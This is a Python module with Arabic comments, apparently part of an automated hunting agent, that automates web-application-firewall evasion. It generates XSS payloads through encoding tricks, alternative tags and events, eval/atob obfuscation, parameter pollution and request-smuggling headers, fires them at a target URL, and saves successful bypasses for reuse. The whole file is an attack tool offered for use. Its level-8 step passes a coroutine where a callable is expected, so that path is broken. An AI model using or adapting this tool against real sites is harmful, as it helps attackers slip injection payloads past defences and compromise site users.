"""
WAF Bypass Ladder — شجرة قرار سلم التجاوز البرمجي
==================================================
بدلاً من رمي payloads عشوائية، ينفّذ الوكيل "سلمًا" مراتبًا من الأسهل للأصعب،
حيث كل درجة تهاجم طبقة مختلفة من منطق WAF:

  1. Encoding (تحويلات التشفير)
  2. Tags (بدائل الوسوم)
  3. Events (بدائل معالجات الأحداث)
  4. JS Obfuscation (تشويش جافاسكريبت بدون كلمات مفتاحية)
  5. Parser Differentials (فروق المحللات / Content-Type / مسار)
  6. HPP (تلوث المعلمات HTTP Parameter Pollution) — متقدم
  7. HTTP/2 Smuggling & Delayed Body — متقدم (بروتوكول)
  8. wafryt_mutation (طفرة تطورية عبر أداة wafryt الخارجية) — متقدم جداً

القاعدة الذهبية: إذا نجح مستوى واحد، يُسجل في بنك الجينات ويُستخدم كنقطة انطلاق
للمرة القادمة. إذا فشل الجميع، يُجرّب التركيب المركب (مستويان أو أكثر).
"""
from __future__ import annotations

import asyncio
import base64
import html
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Tuple

import httpx

from memory.waf_gene_bank import WAFGeneBank, GeneRecord
from tools.tool_manager import ToolManager
from hunter_ai.tools.wafrift_integration import WafriftIntegration


# --------------------------------------------------------------------------- #
# نتائج السلم
# --------------------------------------------------------------------------- #
@dataclass
class BypassAttempt:
    level: int
    level_name: str
    technique: str
    payload: str
    headers: Dict[str, str]
    success: bool = False
    status_code: Optional[int] = None
    failure_reason: Optional[str] = None
    waf_type: str = "unknown"
    target: str = ""


@dataclass
class BypassResult:
    success: bool = False
    target: str = ""
    waf_type: str = "unknown"
    best_payload: Optional[str] = None
    best_level: Optional[int] = None
    best_technique: Optional[str] = None
    attempts: List[BypassAttempt] = field(default_factory=list)
    gene_bank_hit: bool = False  # هل بدأنا من تسجيل ناجح سابق في البنك


# --------------------------------------------------------------------------- #
# مولّدات payloads لكل درجة
# --------------------------------------------------------------------------- #
class PayloadGenerators:
    """جميع مولّدات التحميل لكل درجة من السلم."""

    # ---------- الدرجة 1: Encoding ----------
    @staticmethod
    def level1_encoding(payload: str) -> List[Tuple[str, str, Dict[str, str]]]:
        enc = urllib.parse.quote(payload, safe="")
        double = urllib.parse.quote(enc, safe="")
        uni = "".join(f"%u{ord(c):04X}" for c in payload)
        htmlent = html.escape(payload)
        mixed = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))

        return [
            ("url_encoding", enc, {}),
            ("double_encoding", double, {}),
            ("unicode_%u", uni, {}),
            ("html_entities", htmlent, {}),
            ("mixed_case", mixed, {}),
            ("null_byte", payload + "%00", {}),
        ]

    # ---------- الدرجة 2: Tags ----------
    @staticmethod
    def level2_tags(payload: str) -> List[Tuple[str, str, Dict[str, str]]]:
        tags = [
            ("svg_onload", f"<svg onload={payload}>", {}),
            ("details_ontoggle", f"<details open ontoggle={payload}>", {}),
            ("video_onerror", f"<video><source onerror={payload}>", {}),
            ("math", f"<math><svg onload={payload}>", {}),
            ("iframe_javascript", f"<iframe src=javascript:{payload}>", {}),
            ("body_onload", f"<body onload={payload}>", {}),
            ("input_onfocus", f"<input autofocus onfocus={payload}>", {}),
        ]
        return tags

    # ---------- الدرجة 3: Events ----------
    @staticmethod
    def level3_events(payload: str) -> List[Tuple[str, str, Dict[str, str]]]:
        events = [
            "ontoggle", "onpointerenter", "onanimationend", "onbeforetoggle",
            "onauxclick", "ongotpointercapture", "onlostpointercapture",
            "onbeforeactivate", "onafteractivate",
        ]
        return [(ev, f"<div {ev}={payload}></div>", {}) for ev in events]

    # ---------- الدرجة 4: JS Obfuscation ----------
    @staticmethod
    def level4_js(payload: str) -> List[Tuple[str, str, Dict[str, str]]]:
        inner = payload.strip()
        arg = inner.split("(", 1)[1].rstrip(")") if "(" in inner else "1"
        b64 = base64.b64encode(inner.encode()).decode()
        return [
            ("string_concat", f"window['al'+'ert']({arg})", {}),
            ("unicode_escape", f"al\\u0065rt({arg})", {}),
            ("atob_base64", f"eval(atob('{b64}'))", {}),
            ("template_literal", f"eval(`{inner}`)", {}),
            ("constructor_chain", f"[]['filter']['constructor']('return {inner}')()", {}),
        ]

    # ---------- الدرجة 5: Parser Differentials ----------
    @staticmethod
    def level5_parser(target: str, payload: str) -> List[Tuple[str, str, Dict[str, str]]]:
        return [
            ("content_type_json", payload, {"Content-Type": "application/json"}),
            ("content_type_xml", payload, {"Content-Type": "application/xml"}),
            ("content_type_form", payload, {"Content-Type": "application/x-www-form-urlencoded"}),
            ("path_semicolon", payload, {"X-Original-Path": target + ";.css"}),
            ("path_dot_traversal", payload, {"X-Rewrite-URL": target + "/..%2f..%2f"}),
            ("method_override", payload, {"X-HTTP-Method-Override": "PUT"}),
        ]

    # ---------- الدرجة 6: HPP ----------
    @staticmethod
    def level6_hpp(param_name: str, payload: str) -> List[Tuple[str, str, Dict[str, str]]]:
        half = len(payload) // 2
        return [
            ("hpp_clean_first", f"{param_name}=1&{param_name}={payload}", {}),
            ("hpp_split_payload", f"{param_name}={payload[:half]}&{param_name}={payload[half:]}", {}),
            ("hpp_array_php", f"{param_name}[]=1&{param_name}[]={payload}", {}),
        ]

    # ---------- الدرجة 7: HTTP/2 ----------
    @staticmethod
    def level7_http2(payload: str) -> List[Tuple[str, str, Dict[str, str]]]:
        return [
            ("delayed_body_hint", payload, {"X-Expected-Body-Length": str(len(payload) + 1000)}),
            ("transfer_encoding_chunked_hint", payload, {"Transfer-Encoding": "chunked"}),
            ("content_length_hint", payload, {"Content-Length": "0"}),
        ]


# --------------------------------------------------------------------------- #
# شجرة القرار الرئيسية
# --------------------------------------------------------------------------- #
class WAFBypassLadder:
    """
    ينفّذ السلم بتدرج ويغذي بنك الجينات بكل نتيجة.
    """

    def __init__(self, mgr: ToolManager, gene_bank: Optional[WAFGeneBank] = None):
        self.mgr = mgr
        self.bank = gene_bank or WAFGeneBank()
        self.gen = PayloadGenerators()
        self.wafryt = WafriftIntegration(mgr)

    # ------------------------------------------------------------------ #
    # نقطة الدخول الرئيسية
    # ------------------------------------------------------------------ #
    async def run(
        self,
        target: str,
        param_name: str,
        payload: str,
        waf_type: str = "unknown",
        waf_version: Optional[str] = None,
        method: str = "GET",
    ) -> BypassResult:
        """
        يحاول تجاوز WAF على target باستخدام السلم.
        """
        result = BypassResult(success=False, target=target, waf_type=waf_type)

        # 0. تحقق من بنك الجينات أولًا: هل لدينا تسجيل ناجح لهذا WAF+target؟
        best_known = self.bank.get_best_payloads(waf_type, target=target, min_success_rate=0.5, limit=3)
        if best_known:
            result.gene_bank_hit = True
            result.best_payload = best_known[0].payload
            result.best_level = best_known[0].technique_level
            result.best_technique = best_known[0].technique_name
            result.success = True
            result.attempts.append(BypassAttempt(
                level=0, level_name="gene_bank", technique=best_known[0].technique_name,
                payload=best_known[0].payload, headers={}, success=True,
                waf_type=waf_type, target=target,
            ))
            return result

        # 1-5: الدرجات الأساسية
        level_generators: List[Tuple[int, str, Callable[[], List[Tuple[str, str, Dict[str, str]]]]]] = [
            (1, "encoding", lambda: self.gen.level1_encoding(payload)),
            (2, "tags", lambda: self.gen.level2_tags(payload)),
            (3, "events", lambda: self.gen.level3_events(payload)),
            (4, "js_obfuscation", lambda: self.gen.level4_js(payload)),
            (5, "parser_differentials", lambda: self.gen.level5_parser(target, payload)),
        ]

        for level, level_name, gen_fn in level_generators:
            variants = gen_fn()
            for technique, p, headers in variants:
                attempt = await self._attempt(
                    target, param_name, p, headers, method,
                    level, level_name, technique, waf_type, waf_version,
                )
                result.attempts.append(attempt)
                if attempt.success:
                    result.success = True
                    result.best_payload = p
                    result.best_level = level
                    result.best_technique = technique
                    self.bank.record_attempt(
                        target=target, waf_type=waf_type, waf_version=waf_version,
                        technique_level=level, technique_name=technique, payload=p,
                        success=True, status_code=attempt.status_code, headers=headers,
                    )
                    return result
                # سجل الفشل أيضًا في البنك للتعلم المستقبلي
                self.bank.record_attempt(
                    target=target, waf_type=waf_type, waf_version=waf_version,
                    technique_level=level, technique_name=technique, payload=p,
                    success=False, status_code=attempt.status_code, headers=headers,
                    failure_reason=attempt.failure_reason,
                )

        # 6-8: مستويات متقدمة (HPP, HTTP/2, wafryt) فقط لو الدرجات الأساسية فشلت
        advanced = [
            (6, "hpp", lambda: self.gen.level6_hpp(param_name, payload)),
            (7, "http2", lambda: self.gen.level7_http2(payload)),
        ]

        # الدرجة 8: طفرة تطورية عبر wafryt (إن كانت متاحة)
        if self.wafryt.is_available():
            advanced.append((8, "wafryt_mutation", self._wafryt_variants(target, param_name, payload)))

        for level, level_name, gen_fn in advanced:
            variants = gen_fn()
            for technique, p, headers in variants:
                attempt = await self._attempt(
                    target, param_name, p, headers, method,
                    level, level_name, technique, waf_type, waf_version,
                )
                result.attempts.append(attempt)
                if attempt.success:
                    result.success = True
                    result.best_payload = p
                    result.best_level = level
                    result.best_technique = technique
                    self.bank.record_attempt(
                        target=target, waf_type=waf_type, waf_version=waf_version,
                        technique_level=level, technique_name=technique, payload=p,
                        success=True, status_code=attempt.status_code, headers=headers,
                    )
                    return result
                self.bank.record_attempt(
                    target=target, waf_type=waf_type, waf_version=waf_version,
                    technique_level=level, technique_name=technique, payload=p,
                    success=False, status_code=attempt.status_code, headers=headers,
                    failure_reason=attempt.failure_reason,
                )

        # 9. تركيب مركب: مزيج من المستويات (Encoding+Tag، Tag+Event، إلخ)
        if not result.success:
            composite = self._build_composite(target, payload)
            for technique, p, headers in composite:
                attempt = await self._attempt(
                    target, param_name, p, headers, method,
                    9, "composite", technique, waf_type, waf_version,
                )
                result.attempts.append(attempt)
                if attempt.success:
                    result.success = True
                    result.best_payload = p
                    result.best_level = 9
                    result.best_technique = technique
                    self.bank.record_attempt(
                        target=target, waf_type=waf_type, waf_version=waf_version,
                        technique_level=9, technique_name=technique, payload=p,
                        success=True, status_code=attempt.status_code, headers=headers,
                    )
                    return result
                self.bank.record_attempt(
                    target=target, waf_type=waf_type, waf_version=waf_version,
                    technique_level=9, technique_name=technique, payload=p,
                    success=False, status_code=attempt.status_code, headers=headers,
                    failure_reason=attempt.failure_reason,
                )

        return result

    # ------------------------------------------------------------------ #
    # محاولة فردية (إرسال طلب والتحقق)
    # ------------------------------------------------------------------ #
    async def _attempt(
        self,
        target: str,
        param_name: str,
        payload: str,
        headers: Dict[str, str],
        method: str,
        level: int,
        level_name: str,
        technique: str,
        waf_type: str,
        waf_version: Optional[str],
    ) -> BypassAttempt:
        attempt = BypassAttempt(
            level=level, level_name=level_name, technique=technique,
            payload=payload, headers=headers, waf_type=waf_type, target=target,
        )

        if method == "GET":
            sep = "&" if "?" in target else "?"
            full_url = f"{target}{sep}{param_name}={urllib.parse.quote(payload, safe='')}"
            try:
                async with httpx.AsyncClient(timeout=10, follow_redirects=True) as client:
                    resp = await client.get(full_url, headers=headers)
                attempt.status_code = resp.status_code
                if resp.status_code < 400 and not self._looks_like_waf_block(resp.text):
                    attempt.success = True
                else:
                    attempt.failure_reason = f"status_{resp.status_code}"
            except Exception as exc:
                attempt.failure_reason = str(exc)
        else:
            attempt.failure_reason = "method_not_implemented_in_lite_mode"

        return attempt

    @staticmethod
    def _looks_like_waf_block(body: str) -> bool:
        low = body.lower()
        indicators = [
            "cloudflare", "aws waf", "modsecurity", "blocked", "forbidden",
            "captcha", "access denied", "request rejected", "waf",
        ]
        return any(ind in low for ind in indicators)

    # ------------------------------------------------------------------ #
    # الدرجة 8: طفرة تطورية عبر wafryt (أداة خارجية)
    # ------------------------------------------------------------------ #
    async def _wafryt_variants(
        self, target: str, param_name: str, payload: str
    ) -> List[Tuple[str, str, Dict[str, str]]]:
        """
        تستدعي wafryt.bypass على العنوان الكامل وتعيد البلاي load الناجح إن وُجد.
        إذا فشل wafryt، تعيد قائمة فارغة (لا تكسر المسار).
        """
        sep = "&" if "?" in target else "?"
        full_url = f"{target}{sep}{param_name}={urllib.parse.quote(payload, safe='')}"

        try:
            res = await self.wafryt.bypass(full_url, payload, technique="auto")
        except Exception:
            return []

        if res.success and res.payload:
            return [(f"wafryt_{res.technique_level or 'auto'}", res.payload, {})]
        return []

    # ------------------------------------------------------------------ #
    # تركيبة مركبة (مستويان أو أكثر معًا)
    # ------------------------------------------------------------------ #
    def _build_composite(self, target: str, payload: str) -> List[Tuple[str, str, Dict[str, str]]]:
        enc = urllib.parse.quote(payload, safe="")
        b64 = base64.b64encode(payload.encode()).decode()
        return [
            ("enc+tag", f"<svg onload={enc}>", {}),
            ("enc+js", f"<script>eval(atob('{b64}'))</script>", {}),
            ("tag+event", f"<details open ontoggle={payload}>", {}),
            ("parser+enc", enc, {"Content-Type": "application/json", "X-Original-URL": target + ";.css"}),
        ]


__all__ = ["WAFBypassLadder", "BypassResult", "BypassAttempt"]
